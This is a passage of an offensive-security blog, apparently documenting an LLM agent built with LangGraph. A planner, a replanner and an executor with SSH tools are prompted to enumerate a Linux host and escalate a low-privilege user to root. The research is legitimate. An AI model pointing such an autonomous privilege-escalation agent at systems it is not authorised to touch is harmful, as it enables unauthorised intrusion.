<span class="normal"><a href="#__codelineno-10-55">55</a></span>
<span class="normal"><a href="#__codelineno-10-56">56</a></span>
<span class="normal"><a href="#__codelineno-10-57">57</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-52"><a id="__codelineno-10-52" name="__codelineno-10-52"></a><span class="k">class</span> <span class="nc">Plan</span><span class="p">(</span><span class="n">BaseModel</span><span class="p">):</span>
</span><span id="__span-10-53"><a id="__codelineno-10-53" name="__codelineno-10-53"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Plan to follow in future&quot;&quot;&quot;</span>
</span><span id="__span-10-54"><a id="__codelineno-10-54" name="__codelineno-10-54"></a>
</span><span id="__span-10-55"><a id="__codelineno-10-55" name="__codelineno-10-55"></a>    <span class="n">steps</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="n">Field</span><span class="p">(</span>
</span><span id="__span-10-56"><a id="__codelineno-10-56" name="__codelineno-10-56"></a>        <span class="n">description</span><span class="o">=</span><span class="s2">&quot;different steps to follow, should be in sorted order&quot;</span>
</span><span id="__span-10-57"><a id="__codelineno-10-57" name="__codelineno-10-57"></a>    <span class="p">)</span>
</span></code></pre></div></td></tr></table></div>
<p>The output is thus a simple string list with the different future planning steps. The LLM prompt itself is defined as:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">graphs/plan_and_execute.py: Planner Prompt</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-12">12</a></span>
<span class="normal"><a href="#__codelineno-11-13">13</a></span>
<span class="normal"><a href="#__codelineno-11-14">14</a></span>
<span class="normal"><a href="#__codelineno-11-15">15</a></span>
<span class="normal"><a href="#__codelineno-11-16">16</a></span>
<span class="normal"><a href="#__codelineno-11-17">17</a></span>
<span class="normal"><a href="#__codelineno-11-18">18</a></span>
<span class="normal"><a href="#__codelineno-11-19">19</a></span>
<span class="normal"><a href="#__codelineno-11-20">20</a></span>
<span class="normal"><a href="#__codelineno-11-21">21</a></span>
<span class="normal"><a href="#__codelineno-11-22">22</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12"></a><span class="n">planner_prompt</span> <span class="o">=</span> <span class="n">ChatPromptTemplate</span><span class="o">.</span><span class="n">from_messages</span><span class="p">(</span>
</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13"></a>    <span class="p">[</span>
</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14"></a>        <span class="p">(</span>
</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15"></a>            <span class="s2">&quot;system&quot;</span><span class="p">,</span>
</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16"></a><span class="w">            </span><span class="sd">&quot;&quot;&quot;For the given objective, come up with a simple step by step plan. \</span>
</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17"></a><span class="sd">This plan should involve individual tasks, that if executed correctly will yield the correct answer. Do not add any superfluous steps. \</span>
</span><span id="__span-11-18"><a id="__codelineno-11-18" name="__codelineno-11-18"></a><span class="sd">The result of the final step should be the final answer. Make sure that each step has all the information needed - do not skip steps.&quot;&quot;&quot;</span><span class="p">,</span>
</span><span id="__span-11-19"><a id="__codelineno-11-19" name="__codelineno-11-19"></a>        <span class="p">),</span>
</span><span id="__span-11-20"><a id="__codelineno-11-20" name="__codelineno-11-20"></a>        <span class="p">(</span><span class="s2">&quot;placeholder&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">{messages}</span><span class="s2">&quot;</span><span class="p">),</span>
</span><span id="__span-11-21"><a id="__codelineno-11-21" name="__codelineno-11-21"></a>    <span class="p">]</span>
</span><span id="__span-11-22"><a id="__codelineno-11-22" name="__codelineno-11-22"></a><span class="p">)</span>
</span></code></pre></div></td></tr></table></div>
<p>This is rather generic. The initial user question will be passed in as first message within <code>{messages}</code> and that's more or less it.</p>
<h4 id="replanner"><a class="toclink" href="../../2024/10/14/adding-plan-and-execute-planner/#replanner">Replanner</a></h4>
<p>The result of the replanner node action/step wil be following:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">graphs/plan_and_execute.py: Replanner data structure</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-59">59</a></span>
<span class="normal"><a href="#__codelineno-12-60">60</a></span>
<span class="normal"><a href="#__codelineno-12-61">61</a></span>
<span class="normal"><a href="#__codelineno-12-62">62</a></span>
<span class="normal"><a href="#__codelineno-12-63">63</a></span>
<span class="normal"><a href="#__codelineno-12-64">64</a></span>
<span class="normal"><a href="#__codelineno-12-65">65</a></span>
<span class="normal"><a href="#__codelineno-12-66">66</a></span>
<span class="normal"><a href="#__codelineno-12-67">67</a></span>
<span class="normal"><a href="#__codelineno-12-68">68</a></span>
<span class="normal"><a href="#__codelineno-12-69">69</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-59"><a id="__codelineno-12-59" name="__codelineno-12-59"></a><span class="k">class</span> <span class="nc">Response</span><span class="p">(</span><span class="n">BaseModel</span><span class="p">):</span>
</span><span id="__span-12-60"><a id="__codelineno-12-60" name="__codelineno-12-60"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Response to user.&quot;&quot;&quot;</span>
</span><span id="__span-12-61"><a id="__codelineno-12-61" name="__codelineno-12-61"></a>    <span class="n">response</span><span class="p">:</span> <span class="nb">str</span>
</span><span id="__span-12-62"><a id="__codelineno-12-62" name="__codelineno-12-62"></a>
</span><span id="__span-12-63"><a id="__codelineno-12-63" name="__codelineno-12-63"></a><span class="k">class</span> <span class="nc">Act</span><span class="p">(</span><span class="n">BaseModel</span><span class="p">):</span>
</span><span id="__span-12-64"><a id="__codelineno-12-64" name="__codelineno-12-64"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Action to perform.&quot;&quot;&quot;</span>
</span><span id="__span-12-65"><a id="__codelineno-12-65" name="__codelineno-12-65"></a>
</span><span id="__span-12-66"><a id="__codelineno-12-66" name="__codelineno-12-66"></a>    <span class="n">action</span><span class="p">:</span> <span class="n">Union</span><span class="p">[</span><span class="n">Response</span><span class="p">,</span> <span class="n">Plan</span><span class="p">]</span> <span class="o">=</span> <span class="n">Field</span><span class="p">(</span>
</span><span id="__span-12-67"><a id="__codelineno-12-67" name="__codelineno-12-67"></a>        <span class="n">description</span><span class="o">=</span><span class="s2">&quot;Action to perform. If you want to respond to user, use Response. &quot;</span>
</span><span id="__span-12-68"><a id="__codelineno-12-68" name="__codelineno-12-68"></a>        <span class="s2">&quot;If you need to further use tools to get the answer, use Plan.&quot;</span>
</span><span id="__span-12-69"><a id="__codelineno-12-69" name="__codelineno-12-69"></a>    <span class="p">)</span>
</span></code></pre></div></td></tr></table></div>
<p>So it's either a user <code>Response</code> (consisting of a string) signalling that we have finished, or an updated <code>Plan</code> (the previously mentioned list of strings) which the <code>executor</code> will act upon next.</p>
<p>Let's look at the prompt:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">graphs/plan_and_execute.py: Replanner Prompt</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-24">24</a></span>
<span class="normal"><a href="#__codelineno-13-25">25</a></span>
<span class="normal"><a href="#__codelineno-13-26">26</a></span>
<span class="normal"><a href="#__codelineno-13-27">27</a></span>
<span class="normal"><a href="#__codelineno-13-28">28</a></span>
<span class="normal"><a href="#__codelineno-13-29">29</a></span>
<span class="normal"><a href="#__codelineno-13-30">30</a></span>
<span class="normal"><a href="#__codelineno-13-31">31</a></span>
<span class="normal"><a href="#__codelineno-13-32">32</a></span>
<span class="normal"><a href="#__codelineno-13-33">33</a></span>
<span class="normal"><a href="#__codelineno-13-34">34</a></span>
<span class="normal"><a href="#__codelineno-13-35">35</a></span>
<span class="normal"><a href="#__codelineno-13-36">36</a></span>
<span class="normal"><a href="#__codelineno-13-37">37</a></span>
<span class="normal"><a href="#__codelineno-13-38">38</a></span>
<span class="normal"><a href="#__codelineno-13-39">39</a></span>
<span class="normal"><a href="#__codelineno-13-40">40</a></span>
<span class="normal"><a href="#__codelineno-13-41">41</a></span>
<span class="normal"><a href="#__codelineno-13-42">42</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-24"><a id="__codelineno-13-24" name="__codelineno-13-24"></a><span class="n">replanner_prompt</span> <span class="o">=</span> <span class="n">ChatPromptTemplate</span><span class="o">.</span><span class="n">from_template</span><span class="p">(</span>
</span><span id="__span-13-25"><a id="__codelineno-13-25" name="__codelineno-13-25"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;For the given objective, come up with a simple step by step plan. \</span>
</span><span id="__span-13-26"><a id="__codelineno-13-26" name="__codelineno-13-26"></a><span class="sd">This plan should involve individual tasks, that if executed correctly will yield the correct answer. Do not add any superfluous steps. \</span>
</span><span id="__span-13-27"><a id="__codelineno-13-27" name="__codelineno-13-27"></a><span class="sd">The result of the final step should be the final answer. Make sure that each step has all the information needed - do not skip steps.</span>
</span><span id="__span-13-28"><a id="__codelineno-13-28" name="__codelineno-13-28"></a>
</span><span id="__span-13-29"><a id="__codelineno-13-29" name="__codelineno-13-29"></a><span class="sd">Your objective was this:</span>
</span><span id="__span-13-30"><a id="__codelineno-13-30" name="__codelineno-13-30"></a><span class="sd">{input}</span>
</span><span id="__span-13-31"><a id="__codelineno-13-31" name="__codelineno-13-31"></a>
</span><span id="__span-13-32"><a id="__codelineno-13-32" name="__codelineno-13-32"></a><span class="sd">Your original plan was this:</span>
</span><span id="__span-13-33"><a id="__codelineno-13-33" name="__codelineno-13-33"></a><span class="sd">{plan}</span>
</span><span id="__span-13-34"><a id="__codelineno-13-34" name="__codelineno-13-34"></a>
</span><span id="__span-13-35"><a id="__codelineno-13-35" name="__codelineno-13-35"></a><span class="sd">You have currently done the follow steps:</span>
</span><span id="__span-13-36"><a id="__codelineno-13-36" name="__codelineno-13-36"></a><span class="sd">{past_steps}</span>
</span><span id="__span-13-37"><a id="__codelineno-13-37" name="__codelineno-13-37"></a>
</span><span id="__span-13-38"><a id="__codelineno-13-38" name="__codelineno-13-38"></a><span class="sd">Update your plan accordingly. If no more steps are needed and you can return to the user, then respond with that. Otherwise, fill out the plan. Only add steps to the plan that still NEED to be done. Do not return previously done steps as part of the plan.</span>
</span><span id="__span-13-39"><a id="__codelineno-13-39" name="__codelineno-13-39"></a>
</span><span id="__span-13-40"><a id="__codelineno-13-40" name="__codelineno-13-40"></a><span class="sd">If you were not able to complete the task, stop after 15 planning steps and give a summary to the user.</span>
</span><span id="__span-13-41"><a id="__codelineno-13-41" name="__codelineno-13-41"></a><span class="sd">&quot;&quot;&quot;</span>
</span><span id="__span-13-42"><a id="__codelineno-13-42" name="__codelineno-13-42"></a><span class="p">)</span>
</span></code></pre></div></td></tr></table></div>
<p>The prompt's input is the initial objective (<code>input</code>), the current plan containing all future high-level task steps (<code>plan</code>), and a list of previously executed planning steps (<code>plan_steps</code>). In our implementation, each <code>plan_step</code> also contains a LLM-derived summary of the actions performed by the <code>executor</code> while trying to solve the planning step as well as it's results. This should help the <code>replan</code> agent to better update subsequent plans.</p>
<p>We also tell the LLM to stop after 15 high-level task steps and give a final summary to the user. If the objective has been solved before, the LLM will detect this too and auto-magically stop execution.</p>
<h4 id="agentexecutor"><a class="toclink" href="../../2024/10/14/adding-plan-and-execute-planner/#agentexecutor">Agent/Executor</a></h4>
<p>The <code>executor</code> node/function is passed into our generic path as a callback function. This allows to easily modify our generic graph to solve different objectives with their respective specialized executor agents.</p>
<p>Let's start with our simple implementation:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">plan_and_execute.py: Executor Function</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-29">29</a></span>
<span class="normal"><a href="#__codelineno-14-30">30</a></span>
<span class="normal"><a href="#__codelineno-14-31">31</a></span>
<span class="normal"><a href="#__codelineno-14-32">32</a></span>
<span class="normal"><a href="#__codelineno-14-33">33</a></span>
<span class="normal"><a href="#__codelineno-14-34">34</a></span>
<span class="normal"><a href="#__codelineno-14-35">35</a></span>
<span class="normal"><a href="#__codelineno-14-36">36</a></span>
<span class="normal"><a href="#__codelineno-14-37">37</a></span>
<span class="normal"><a href="#__codelineno-14-38">38</a></span>
<span class="normal"><a href="#__codelineno-14-39">39</a></span>
<span class="normal"><a href="#__codelineno-14-40">40</a></span>
<span class="normal"><a href="#__codelineno-14-41">41</a></span>
<span class="normal"><a href="#__codelineno-14-42">42</a></span>
<span class="normal"><a href="#__codelineno-14-43">43</a></span>
<span class="normal"><a href="#__codelineno-14-44">44</a></span>
<span class="normal"><a href="#__codelineno-14-45">45</a></span>
<span class="normal"><a href="#__codelineno-14-46">46</a></span>
<span class="normal"><a href="#__codelineno-14-47">47</a></span>
<span class="normal"><a href="#__codelineno-14-48">48</a></span>
<span class="normal"><a href="#__codelineno-14-49">49</a></span>
<span class="normal"><a href="#__codelineno-14-50">50</a></span>
<span class="normal"><a href="#__codelineno-14-51">51</a></span>
<span class="normal"><a href="#__codelineno-14-52">52</a></span>
<span class="normal"><a href="#__codelineno-14-53">53</a></span>
<span class="normal"><a href="#__codelineno-14-54">54</a></span>
<span class="normal"><a href="#__codelineno-14-55">55</a></span>
<span class="normal"><a href="#__codelineno-14-56">56</a></span>
<span class="normal"><a href="#__codelineno-14-57">57</a></span>
<span class="normal"><a href="#__codelineno-14-58">58</a></span>
<span class="normal"><a href="#__codelineno-14-59">59</a></span>
<span class="normal"><a href="#__codelineno-14-60">60</a></span>
<span class="normal"><a href="#__codelineno-14-61">61</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-29"><a id="__codelineno-14-29" name="__codelineno-14-29"></a><span class="n">llm2</span> <span class="o">=</span> <span class="n">ChatOpenAI</span><span class="p">(</span><span class="n">model</span><span class="o">=</span><span class="s2">&quot;gpt-4o&quot;</span><span class="p">,</span> <span class="n">temperature</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span><span id="__span-14-30"><a id="__codelineno-14-30" name="__codelineno-14-30"></a><span class="n">tools</span> <span class="o">=</span> <span class="p">[</span><span class="n">SshExecuteTool</span><span class="p">(</span><span class="n">conn</span><span class="p">),</span> <span class="n">SshTestCredentialsTool</span><span class="p">(</span><span class="n">conn</span><span class="p">)]</span>
</span><span id="__span-14-31"><a id="__codelineno-14-31" name="__codelineno-14-31"></a><span class="n">llm2_with_tools</span> <span class="o">=</span> <span class="n">llm2</span><span class="o">.</span><span class="n">bind_tools</span><span class="p">(</span><span class="n">tools</span><span class="p">)</span>
</span><span id="__span-14-32"><a id="__codelineno-14-32" name="__codelineno-14-32"></a>
</span><span id="__span-14-33"><a id="__codelineno-14-33" name="__codelineno-14-33"></a><span class="k">def</span> <span class="nf">execute_step</span><span class="p">(</span><span class="n">state</span><span class="p">:</span> <span class="n">PlanExecute</span><span class="p">):</span>
</span><span id="__span-14-34"><a id="__codelineno-14-34" name="__codelineno-14-34"></a>    <span class="n">plan</span> <span class="o">=</span> <span class="n">state</span><span class="p">[</span><span class="s2">&quot;plan&quot;</span><span class="p">]</span>
</span><span id="__span-14-35"><a id="__codelineno-14-35" name="__codelineno-14-35"></a>    <span class="n">task</span> <span class="o">=</span> <span class="n">plan</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span id="__span-14-36"><a id="__codelineno-14-36" name="__codelineno-14-36"></a>
</span><span id="__span-14-37"><a id="__codelineno-14-37" name="__codelineno-14-37"></a>    <span class="n">template</span> <span class="o">=</span> <span class="n">PromptTemplate</span><span class="o">.</span><span class="n">from_template</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
</span><span id="__span-14-38"><a id="__codelineno-14-38" name="__codelineno-14-38"></a><span class="s2">    You are a low-privilege user </span><span class="si">{username}</span><span class="s2"> with password </span><span class="si">{password}</span><span class="s2"> on a linux system and your goal is to become the root user by executing commands on the remote system.</span>
</span><span id="__span-14-39"><a id="__codelineno-14-39" name="__codelineno-14-39"></a>
</span><span id="__span-14-40"><a id="__codelineno-14-40" name="__codelineno-14-40"></a><span class="s2">    To achieve this, focus upon </span><span class="si">{task}</span>
</span><span id="__span-14-41"><a id="__codelineno-14-41" name="__codelineno-14-41"></a>
</span><span id="__span-14-42"><a id="__codelineno-14-42" name="__codelineno-14-42"></a><span class="s2">    Do not repeat already tried escalation attacks. You should focus upon enumeration and privilege escalation. If you were able to become root, describe the used method as final message. Stop after 10 executions. If not successful until then, give a summary of gathered facts.</span>
</span><span id="__span-14-43"><a id="__codelineno-14-43" name="__codelineno-14-43"></a><span class="s2">    &quot;&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">password</span><span class="p">,</span><span class="n">task</span><span class="o">=</span><span class="n">plan</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span><span id="__span-14-44"><a id="__codelineno-14-44" name="__codelineno-14-44"></a>
</span><span id="__span-14-45"><a id="__codelineno-14-45" name="__codelineno-14-45"></a>    <span class="c1"># create our simple graph</span>
</span><span id="__span-14-46"><a id="__codelineno-14-46" name="__codelineno-14-46"></a>    <span class="n">graph_builder</span> <span class="o">=</span> <span class="n">create_chat_tool_agent_graph</span><span class="p">(</span><span class="n">llm2_with_tools</span><span class="p">,</span> <span class="n">tools</span><span class="p">)</span>
</span><span id="__span-14-47"><a id="__codelineno-14-47" name="__codelineno-14-47"></a>    <span class="n">graph</span> <span class="o">=</span> <span class="n">graph_builder</span><span class="o">.</span><span class="n">compile</span><span class="p">()</span>
</span><span id="__span-14-48"><a id="__codelineno-14-48" name="__codelineno-14-48"></a>
</span><span id="__span-14-49"><a id="__codelineno-14-49" name="__codelineno-14-49"></a>    <span class="n">events</span> <span class="o">=</span> <span class="n">graph</span><span class="o">.</span><span class="n">stream</span><span class="p">(</span>
</span><span id="__span-14-50"><a id="__codelineno-14-50" name="__codelineno-14-50"></a>        <span class="p">{</span><span class="s2">&quot;messages&quot;</span><span class="p">:</span> <span class="p">[(</span><span class="s2">&quot;user&quot;</span><span class="p">,</span> <span class="n">template</span><span class="p">)]},</span>
</span><span id="__span-14-51"><a id="__codelineno-14-51" name="__codelineno-14-51"></a>        <span class="n">stream_mode</span><span class="o">=</span><span class="s1">&#39;values&#39;</span>
</span><span id="__span-14-52"><a id="__codelineno-14-52" name="__codelineno-14-52"></a>    <span class="p">)</span>
</span><span id="__span-14-53"><a id="__codelineno-14-53" name="__codelineno-14-53"></a>
</span><span id="__span-14-54"><a id="__codelineno-14-54" name="__codelineno-14-54"></a>    <span class="n">agent_response</span> <span class="o">=</span> <span class="kc">None</span>
</span><span id="__span-14-55"><a id="__codelineno-14-55" name="__codelineno-14-55"></a>    <span class="k">for</span> <span class="n">event</span> <span class="ow">in</span> <span class="n">events</span><span class="p">:</span>
</span><span id="__span-14-56"><a id="__codelineno-14-56" name="__codelineno-14-56"></a>        <span class="n">print_event</span><span class="p">(</span><span class="n">console</span><span class="p">,</span> <span class="n">event</span><span class="p">)</span>
</span><span id="__span-14-57"><a id="__codelineno-14-57" name="__codelineno-14-57"></a>        <span class="n">agent_response</span> <span class="o">=</span> <span class="n">event</span>
</span><span id="__span-14-58"><a id="__codelineno-14-58" name="__codelineno-14-58"></a>
</span><span id="__span-14-59"><a id="__codelineno-14-59" name="__codelineno-14-59"></a>    <span class="k">return</span> <span class="p">{</span>
</span><span id="__span-14-60"><a id="__codelineno-14-60" name="__codelineno-14-60"></a>        <span class="s2">&quot;past_steps&quot;</span><span class="p">:</span> <span class="p">[(</span><span class="n">task</span><span class="p">,</span> <span class="n">agent_response</span><span class="p">[</span><span class="s2">&quot;messages&quot;</span><span class="p">][</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">content</span><span class="p">)],</span>
</span><span id="__span-14-61"><a id="__codelineno-14-61" name="__codelineno-14-61"></a>    <span class="p">}</span>
</span></code></pre></div></td></tr></table></div>
<p>We are reusing our <a href="../../2024/10/10/first-steps-and-initial-version/">initial simple agent</a> as executor on line 46. On lines 29-31 we are creating a new connection to OpenAI and configure some SSH-based tools (as mentioned in the original post) for our executor agent. This fully separated the LLM connection, graph history and supported tools from the LLM-configuration used by the plan-and-execute graph and would allow for using different LLMs for the <code>planner</code> and <code>executor</code> respectively.</p>
<p>Starting on line 49 , we execute our sub-agent and output its steps before returning the final step on line 59 as <code>past_steps</code>. This will append our agent's output (which includes a generated summary of its results) to <code>past_steps</code> within our shared state (which will subsequently be used by the <code>replanner</code> agent to refine future planning steps).</p>
<h3 id="wiring-it-up-and-starting-it"><a class="toclink" href="../../2024/10/14/adding-plan-and-execute-planner/#wiring-it-up-and-starting-it">Wiring it up and starting it</a></h3>
<p>The only thins left is to wire up everything, provide the initial template and output the occurring events (to see what our LLM agent is doing):</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">plan_and_execute.py: Starting our Agent</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-64">64</a></span>
<span class="normal"><a href="#__codelineno-15-65">65</a></span>
<span class="normal"><a href="#__codelineno-15-66">66</a></span>
<span class="normal"><a href="#__codelineno-15-67">67</a></span>
<span class="normal"><a href="#__codelineno-15-68">68</a></span>
<span class="normal"><a href="#__codelineno-15-69">69</a></span>
<span class="normal"><a href="#__codelineno-15-70">70</a></span>
<span class="normal"><a href="#__codelineno-15-71">71</a></span>
<span class="normal"><a href="#__codelineno-15-72">72</a></span>
<span class="normal"><a href="#__codelineno-15-73">73</a></span>
<span class="normal"><a href="#__codelineno-15-74">74</a></span>
<span class="normal"><a href="#__codelineno-15-75">75</a></span>
<span class="normal"><a href="#__codelineno-15-76">76</a></span>
<span class="normal"><a href="#__codelineno-15-77">77</a></span>
<span class="normal"><a href="#__codelineno-15-78">78</a></span>
<span class="normal"><a href="#__codelineno-15-79">79</a></span>
<span class="normal"><a href="#__codelineno-15-80">80</a></span>
<span class="normal"><a href="#__codelineno-15-81">81</a></span>
<span class="normal"><a href="#__codelineno-15-82">82</a></span>
<span class="normal"><a href="#__codelineno-15-83">83</a></span>
<span class="normal"><a href="#__codelineno-15-84">84</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-64"><a id="__codelineno-15-64" name="__codelineno-15-64"></a><span class="n">workflow</span> <span class="o">=</span> <span class="n">create_plan_and_execute_graph</span><span class="p">(</span><span class="n">llm</span><span class="p">,</span> <span class="n">execute_step</span><span class="p">)</span>
</span><span id="__span-15-65"><a id="__codelineno-15-65" name="__codelineno-15-65"></a><span class="n">app</span> <span class="o">=</span> <span class="n">workflow</span><span class="o">.</span><span class="n">compile</span><span class="p">()</span>
</span><span id="__span-15-66"><a id="__codelineno-15-66" name="__codelineno-15-66"></a><span class="nb">print</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">get_graph</span><span class="p">(</span><span class="n">xray</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">draw_ascii</span><span class="p">())</span>
</span><span id="__span-15-67"><a id="__codelineno-15-67" name="__codelineno-15-67"></a>
</span><span id="__span-15-68"><a id="__codelineno-15-68" name="__codelineno-15-68"></a><span class="c1"># now start our agent and give it our initial prompt (&#39;get root&#39;)</span>
</span><span id="__span-15-69"><a id="__codelineno-15-69" name="__codelineno-15-69"></a><span class="n">template</span> <span class="o">=</span> <span class="n">PromptTemplate</span><span class="o">.</span><span class="n">from_template</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
</span><span id="__span-15-70"><a id="__codelineno-15-70" name="__codelineno-15-70"></a><span class="s2">You are a low-privilege user </span><span class="si">{username}</span><span class="s2"> with password </span><span class="si">{password}</span><span class="s2"> on a linux system and your goal is to become the root user by executing commands on the remote system.</span>
</span><span id="__span-15-71"><a id="__codelineno-15-71" name="__codelineno-15-71"></a>
</span><span id="__span-15-72"><a id="__codelineno-15-72" name="__codelineno-15-72"></a><span class="s2">Do not repeat already tried escalation attacks. You should focus upon enumeration and privilege escalation. If you were able to become root, describe the used method as final message.</span>
</span><span id="__span-15-73"><a id="__codelineno-15-73" name="__codelineno-15-73"></a><span class="s2">&quot;&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">password</span><span class="p">)</span>
</span><span id="__span-15-74"><a id="__codelineno-15-74" name="__codelineno-15-74"></a>
</span><span id="__span-15-75"><a id="__codelineno-15-75" name="__codelineno-15-75"></a><span class="c1"># start everything</span>
</span><span id="__span-15-76"><a id="__codelineno-15-76" name="__codelineno-15-76"></a><span class="n">events</span> <span class="o">=</span> <span class="n">app</span><span class="o">.</span><span class="n">stream</span><span class="p">(</span>
</span><span id="__span-15-77"><a id="__codelineno-15-77" name="__codelineno-15-77"></a>    <span class="nb">input</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;input&quot;</span><span class="p">:</span> <span class="n">template</span> <span class="p">},</span>
</span><span id="__span-15-78"><a id="__codelineno-15-78" name="__codelineno-15-78"></a>    <span class="n">config</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;recursion_limit&quot;</span><span class="p">:</span> <span class="mi">50</span><span class="p">},</span>
</span><span id="__span-15-79"><a id="__codelineno-15-79" name="__codelineno-15-79"></a>    <span class="n">stream_mode</span> <span class="o">=</span> <span class="s2">&quot;values&quot;</span>
</span><span id="__span-15-80"><a id="__codelineno-15-80" name="__codelineno-15-80"></a><span class="p">)</span>
</span><span id="__span-15-81"><a id="__codelineno-15-81" name="__codelineno-15-81"></a>
</span><span id="__span-15-82"><a id="__codelineno-15-82" name="__codelineno-15-82"></a><span class="c1"># output all occurring logs</span>
</span><span id="__span-15-83"><a id="__codelineno-15-83" name="__codelineno-15-83"></a><span class="k">for</span> <span class="n">event</span> <span class="ow">in</span> <span class="n">events</span><span class="p">:</span>
</span><span id="__span-15-84"><a id="__codelineno-15-84" name="__codelineno-15-84"></a>    <span class="n">print_event</span><span class="p">(</span><span class="n">console</span><span class="p">,</span> <span class="n">event</span><span class="p">)</span>
</span></code></pre></div></td></tr></table></div>
<p>And that's it! Enjoy your multi-agent driven plan-and-execute architecture!</p>
<h3 id="improvement-ideas"><a class="toclink" href="../../2024/10/14/adding-plan-and-execute-planner/#improvement-ideas">Improvement Ideas</a></h3>
<p>Before we move further with our exploration of offensive graphs,, we might want to investigate logging and tracing options. As we are now starting subgraphs (or might even run subgraphs/agents in-parallel), traditional console output becomes confusing to follow. Stay tuned!</p>
    
  </div>
</article>
      
        <article class="md-post md-post--excerpt">
  <header class="md-post__header">
    
      <nav class="md-post__authors md-typeset">
        
          <span class="md-author">
            <img src="https://avatars.githubusercontent.com/u/20667?v=4" alt="Andreas Happe">
          </span>
        
      </nav>
    
    <div class="md-post__meta md-meta">
      <ul class="md-meta__list">
        <li class="md-meta__item">
          <time datetime="2024-10-12 00:00:00">October 12, 2024</time></li>
        
          <li class="md-meta__item">
            in
            
              <a href="../../category/initial-journey/" class="md-meta__link">initial-journey</a></li>
        
        
          
          <li class="md-meta__item">
            
              2 min read
            
          </li>
        
      </ul>
      
    </div>
  </header>
  <div class="md-post__content md-typeset">
    <h2 id="simplify-our-tool-calling-agent-through-create_react_agent"><a class="toclink" href="../../2024/10/12/simplify-our-tool-calling-agent-through-create_react_agent/">Simplify our Tool-Calling Agent through <code>create_react_agent</code></a></h2>
<p>LangGraph has some amazing <a href="https://langchain-ai.github.io/langgraph/reference/prebuilt/">Prebuilt Components</a>, one of them is the <a href="https://langchain-ai.github.io/langgraph/reference/prebuilt/#langgraph.prebuilt.chat_agent_executor.create_react_agent"><code>create_react_agent</code> function</a> that allows you to hughely simplify creating new tool-using agents.</p>
<p>The full source code can be found <a href="https://github.com/andreashappe/offensivegraphs/blob/b806dbc2196434137393cbc411ab7c879c70c7a9/src/switch-to-react.py">within our github history</a>.</p>
<h3 id="the-simplified-version"><a class="toclink" href="../../2024/10/12/simplify-our-tool-calling-agent-through-create_react_agent/#the-simplified-version">The simplified version</a></h3>
<p>This willb e based upon our <a href="../../2024/10/11/improving-configuration-handling-esp-for-tools/">recent configuration-improved version</a>. Similar to that version, we start by reading the configuration data, setting up our LLM, connecting to the target system via SSH, and configuring tools for usage through LLMs:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Initial Configuration</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-10">10</a></span>
<span class="normal"><a href="#__codelineno-3-11">11</a></span>
<span class="normal"><a href="#__codelineno-3-12">12</a></span>
<span class="normal"><a href="#__codelineno-3-13">13</a></span>
<span class="normal"><a href="#__codelineno-3-14">14</a></span>
<span class="normal"><a href="#__codelineno-3-15">15</a></span>
<span class="normal"><a href="#__codelineno-3-16">16</a></span>
<span class="normal"><a href="#__codelineno-3-17">17</a></span>
<span class="normal"><a href="#__codelineno-3-18">18</a></span>
